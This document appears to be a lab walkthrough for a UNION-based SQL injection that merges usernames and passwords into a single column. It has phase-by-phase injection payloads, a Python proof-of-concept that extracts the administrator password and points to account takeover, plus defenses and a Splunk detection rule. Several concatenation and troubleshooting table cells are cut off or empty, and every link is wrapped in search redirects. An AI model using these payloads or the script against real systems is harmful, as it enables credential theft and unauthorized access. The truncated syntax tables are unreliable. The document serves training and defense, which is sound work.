# Lab Walkthrough: SQL Injection UNION Attack, Retrieving Multiple Values in a Single Column

* **Vulnerability Type:** In-Band SQL Injection (UNION-Based)
* **Target Context:** Data Exfiltration via String Concatenation
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Not Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%25231-vulnerability-architecture--mechanism&utm_source=gemini)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%25232-lab-objectives--verification-criteria&utm_source=gemini)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%25233-step-by-step-exploitation-flow&utm_source=gemini)
4. [Cross-Dialect Concatenation Comparison](https://www.google.com/search?q=%25234-cross-dialect-concatenation-comparison&utm_source=gemini)
5. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%25235-automated-exploitation-script-python-poc&utm_source=gemini)
6. [Defense & Prevention](https://www.google.com/search?q=%25236-defense--prevention&utm_source=gemini)
7. [Detection & SIEM Monitoring Rules](https://www.google.com/search?q=%25237-detection--siem-monitoring-rules&utm_source=gemini)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%25238-troubleshooting--diagnostic-runbook&utm_source=gemini)
9. [References & Standards](https://www.google.com/search?q=%25239-references--standards&utm_source=gemini)

---

## 1. Vulnerability Architecture & Mechanism

When performing a `UNION` SQL injection, the injected query must perfectly match the column count and data types of the original query. A bottleneck occurs when the attacker needs to extract multiple data fields (e.g., `username` and `password`), but the original query only contains **one** column capable of holding string data.

To bypass this restriction, attackers utilize SQL string concatenation functions. This allows multiple distinct database fields to be merged into a single string (separated by a delimiter), enabling full data extraction through a single column.

* **Real-World Analogy:** Imagine trying to mail a laptop and a charger to a friend, but the post office only allows you to use a single, narrow shipping tube. Instead of shipping them separately (which is rejected), you tie them together with a bright red string (the delimiter) and slide them into the tube as one combined object.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                 SQLi: SINGLE-COLUMN CONCATENATION FLOW                 │
└────────────────────────────────────────────────────────────────────────┘

  [Database Table: users]
  │ username │ password │
  │ admin    │ 12345    │

  [Attacker Payload]
  UNION SELECT NULL, username || '~' || password FROM users--
                           │      │      │
                           ▼      ▼      ▼
  [Execution & Coercion]
  Col 1 (NULL)    -> Ignored (Used only to align column width)
  Col 2 (String)  -> Database evaluates to: 'admin~12345'

  [Frontend Output]
  <tr><td>admin~12345</td></tr>

```

> **Learning Checkpoint 1:** Why use a delimiter like `~` or `:`? If you concatenate `admin` and `12345` without a delimiter, the output is `admin12345`. During post-exploitation, it becomes impossible to programmatically parse where the username ends and the password begins. Unique delimiters ensure clean data parsing.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The product category filter (`/filter?category=`).
* **Primary Objective:** Extract both usernames and passwords from the `users` table despite having only one string-compatible column, then authenticate as the `administrator`.
* **Validation Signal:** The lab is marked solved upon successful authentication into the administrator panel.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Determine Column Count

* **Action:** Probe the structural width of the original query using incremental `NULL` values.
* **Payload:** `category=Gifts'+UNION+SELECT+NULL,NULL--`
* **Result:** `HTTP 200 OK`. The query expects exactly **two columns**.

### Phase 2: Identify Text-Compatible Columns

* **Action:** Slide a text literal across the array to find which columns accept strings.
* **Probe 1:** `'+UNION+SELECT+'abc',NULL--` -> `HTTP 500 Internal Server Error`.
* **Probe 2:** `'+UNION+SELECT+NULL,'abc'--` -> `HTTP 200 OK`.
* **Conclusion:** Only the second column supports string data.

### Phase 3: Concatenation & Exfiltration

* **Action:** Merge the `username` and `password` fields from the `users` table into a single payload using the string concatenation operator (`||`), separated by a tilde (`~`).
* **Payload:** `category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
* **Result:** The application renders the combined strings (e.g., `administrator~p4ssw0rd123`) inside the DOM.

### Phase 4: Account Takeover

* **Action:** Parse the exfiltrated string, navigate to `/login`, and authenticate using the extracted administrator credentials.

> **Learning Checkpoint 2:** Why did `'+UNION+SELECT+'abc',NULL--` throw a 500 error? The first column in the backend query is strictly typed (likely an `INT` for a product ID). Attempting to force the string `'abc'` into an integer column causes a type conversion crash at the database execution layer.

---

## 4. Cross-Dialect Concatenation Comparison

Syntax for string concatenation varies heavily across database engines. Identifying the correct syntax is a reliable way to fingerprint the backend SQL dialect.

| Database Engine | Concatenation Syntax | Example Payload |
| --- | --- | --- |
| **PostgreSQL / Oracle** | ` |  |
| **MySQL / MariaDB** | `CONCAT()` | `CONCAT(username, '~', password)` |
| **MySQL (Alternative)** | `CONCAT_WS()` | `CONCAT_WS('~', username, password)` |
| **Microsoft SQL Server** | `+` | `username + '~' + password` |
| **SQLite** | ` |  |

---

## 5. Automated Exploitation Script (Python PoC)

This script automates payload delivery and parses the concatenated string to isolate the administrator's password.

```python
#!/usr/bin/env python3
"""
UNION SQLi Concatenation Automator (PoC)
Extracts and parses concatenated credentials from a single text column.
"""

import requests
import re
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exfiltrate_concatenated_creds(target_url):
    session = requests.Session()
    base_url = f"{target_url}/filter?category=Gifts"
    
    # Payload targeting the 2nd column using PostgreSQL/Oracle concatenation
    payload = "'+UNION+SELECT+NULL,username||'~'||password+FROM+users--"
    
    print(f"[*] Sending Concatenation Payload: {payload}")
    response = session.get(base_url + payload, verify=False)
    
    if response.status_code == 200:
        print("[+] Query executed. Parsing DOM for concatenated credentials...")
        
        # Regex looks for "administrator~[password]" pattern
        matches = re.search(r'administrator~([a-zA-Z0-9]{1,32})', response.text, re.IGNORECASE)
        
        if matches:
            admin_pass = matches.group(1)
            print(f"\n[!] CRITICAL DATA COMPROMISED:")
            print(f"    Username: administrator")
            print(f"    Password: {admin_pass}")
            print("\n[*] Proceed to /login to complete account takeover.")
        else:
            print("[-] Payload executed, but could not parse the administrator credentials.")
    else:
        print(f"[-] Exploit failed. HTTP Status: {response.status_code}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <TARGET_BASE_URL>")
        sys.exit(1)
        
    exfiltrate_concatenated_creds(sys.argv[1].rstrip('/'))

```

---

## 6. Defense & Prevention

* **Parameterized Queries (Prepared Statements):** The primary defense. Parameterization ensures the database driver treats the user input strictly as a literal data string, never as executable SQL structure.
* **Input Validation (Allow-listing):** Enforce strict validation on the `category` parameter. If the category should only be "Gifts" or "Tech", drop the request immediately if it contains unexpected characters like `'` or `+`.

---

## 7. Detection & SIEM Monitoring Rules

Security Operations Centers (SOC) can detect this technique by monitoring web traffic for SQL concatenation operators paired with common database metadata keywords.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| eval decoded_uri=urldecode(uri_query)
| search decoded_uri="*UNION*SELECT*" AND (decoded_uri="*||*" OR decoded_uri="*CONCAT*")
| stats count by src_ip, decoded_uri, status
| where count > 0

```

*Detection Logic:* The presence of structural SQL operators (`UNION`) combined with string manipulation functions (`||`, `CONCAT`) in HTTP parameters is a high-confidence indicator of active SQLi exfiltration.

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **`HTTP 500 Internal Server Error`** | Incorrect dialect syntax. | If ` |
| **Returns 200 OK, but prints `username~password` literally** | String literal mistake. | Ensure you did not wrap the column names in single quotes. `'username |
| **Query succeeds, but data is hidden** | Application truncates rows. | Use an invalid category (e.g., `category=DOES_NOT_EXIST'+UNION...`) to force the database to return an empty original set, leaving only your injected row to be rendered on the page. |

---

## 9. References & Standards

* [PortSwigger: SQL Injection UNION Attacks](https://www.google.com/search?q=https://portswigger.net/web-security/sql-injection/union-attacks&utm_source=gemini)
* [OWASP Top 10-2021: A03 - Injection](https://www.google.com/search?q=https://owasp.org/Top10/A03_2021-Injection/&utm_source=gemini)

---

> **Key Insight:** Database constraints are mathematical, not absolute barriers. When an application artificially limits your exfiltration bandwidth to a single column, string concatenation allows you to serialize complex, multi-field database rows into a single outbound stream.
